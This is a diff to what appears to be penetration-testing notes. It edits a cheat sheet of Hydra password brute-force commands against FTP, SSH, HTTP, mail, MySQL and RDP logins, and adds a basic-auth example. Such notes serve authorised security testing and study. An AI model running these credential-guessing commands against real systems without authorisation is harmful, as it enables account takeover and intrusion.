@@ -77,15 +77,16 @@ Hydra's basic syntax:
 hydra [login_options] [password_options] [attack_options] [service_options]
 ```
 Few examples:
-- FTP: `hydra -l admin -P /path/to/password_list.txt ftp://$ip`, `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
+- FTP: `hydra -l admin -P /path/to/password_list.txt ftp://$ip`, `hydra -L usernames.txt -P passwords.txt -s $port -V ftp.example.com ftp`
 - SSH: `hydra -l root -P /path/to/password_list.txt ssh://$ip`, `hydra -l root -p toor -M targets.txt ssh`
-- HTTP-GET: `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
+- HTTP-GET: `hydra -L usernames.txt -P passwords.txt www.example.com http-get`, `hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt $ip http-get / -s $port`
 - HTTP-POST: `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`,`hydra -l admin -P /path/to/password_list.txt $ip http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`
 - SMTP: `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`
 - POP3: `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`
 - IMAP: `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`
 - MySQL: `hydra -l root -P /path/to/password_list.txt mysql://$ip`
 - RDP: `hydra -l admin -P /path/to/password_list.txt rdp://$ip`, `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 $ip rdp`
+
 
 
 
